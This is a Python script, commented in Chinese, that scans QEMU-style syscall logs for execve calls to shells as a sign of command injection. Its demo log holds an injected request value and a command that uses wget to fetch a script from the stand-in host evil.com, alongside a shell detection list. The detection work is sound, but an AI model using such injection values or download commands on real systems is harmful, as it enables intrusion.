import re
import argparse

# 定义我们认为可疑的、通常由命令注入攻击执行的程序
# 这个列表保持不变
SUSPICIOUS_COMMANDS = {
    "/bin/sh",
    "/bin/bash",
    "/bin/csh",
    "/usr/bin/sh",
    "/usr/bin/bash",
    "sh",
    "bash",
}

def analyze_qemu_log(log_path):
    """
    分析给定的QEMU格式的系统调用日志，检测潜在的命令注入漏洞迹象。

    Args:
        log_path (str): 形如 "QEMU <syscall>: <args>" 的日志文件路径。

    Returns:
        bool: 如果检测到可疑活动，返回 True，否则返回 False。
    """
    print(f"[*] 开始分析QEMU格式的日志文件: {log_path}")
    vulnerability_found = False
    
    # 新的正则表达式用于解析 "QEMU <syscall>: <args>" 格式
    # 示例: QEMU execve: /bin/sh -c "reboot"
    # 第1组捕获syscall名称 (execve), 第2组捕获其参数 (/bin/sh ...)
    qemu_log_re = re.compile(r'^QEMU\s+([a-zA-Z_]\w*):\s+(.*)$')

    try:
        with open(log_path, 'r') as f:
            for line_num, line in enumerate(f, 1):
                match = qemu_log_re.search(line.strip())
                
                if not match:
                    continue # 如果行不匹配格式，则跳过

                syscall_name = match.group(1)
                arguments = match.group(2)
                
                # 我们的目标是检测 execve 调用
                if syscall_name == 'execve':
                    # 从参数字符串中提取第一个词，即被执行的程序
                    # " /bin/sh -c 'ls'" -> "/bin/sh"
                    command_path = arguments.split()[0]
                    
                    # 检查执行的命令是否在我们的可疑列表中
                    if command_path in SUSPICIOUS_COMMANDS:
                        print("\n" + "="*50)
                        print(f"[!!!] 高危警报：检测到潜在的命令注入！")
                        print(f"      - 行号: {line_num}")
                        print(f"      - 证据: 检测到QEMU执行了可疑的Shell -> {command_path}")
                        print(f"      - 完整日志: {line.strip()}")
                        print("="*50 + "\n")
                        vulnerability_found = True

    except FileNotFoundError:
        print(f"[!] 错误: 文件未找到 {log_path}")
        return False
    except Exception as e:
        print(f"[!] 分析时发生未知错误: {e}")
        return False
        
    if not vulnerability_found:
        print("[*] 分析完成。未在日志中发现明确的命令注入特征。")
        
    return vulnerability_found

def create_sample_qemu_log():
    """创建一个用于演示的、符合新格式的假日志文件"""
    sample_data = """
QEMU open: /var/www/index.html
QEMU write: Sent main page
QEMU read: Received GET /api?user_input=hello
QEMU write: Sent API response for hello
# 攻击者发送了一个恶意请求
QEMU read: Received GET /api?user_input=;%20/bin/sh%20-c%20'wget%20http://evil.com/pwn.sh'
# 应用程序错误地执行了用户输入
QEMU execve: /bin/sh -c 'wget http://evil.com/pwn.sh'
QEMU open: pwn.sh
QEMU close: 3
"""
    log_filename = "qemu_trace.log"
    with open(log_filename, "w") as f:
        f.write(sample_data.strip())
    # print(f"[*] 已生成演示日志文件: {log_filename}")
    return log_filename

if __name__ == '__main__':
    # 创建一个演示文件，方便直接运行脚本
    default_logfile = create_sample_qemu_log()

    # 设置命令行参数解析
    parser = argparse.ArgumentParser(
        description="一个简单的QEMU格式syscall分析器，用于检测潜在的命令注入漏洞。",
        epilog=f"示例用法: python your_script_name.py {default_logfile}"
    )
    parser.add_argument(
        "logfile", 
        nargs='?', 
        default=default_logfile, 
        help=f"要分析的QEMU格式日志文件路径 (默认为: {default_logfile})"
    )
    
    args = parser.parse_args()
    
    analyze_qemu_log(args.logfile)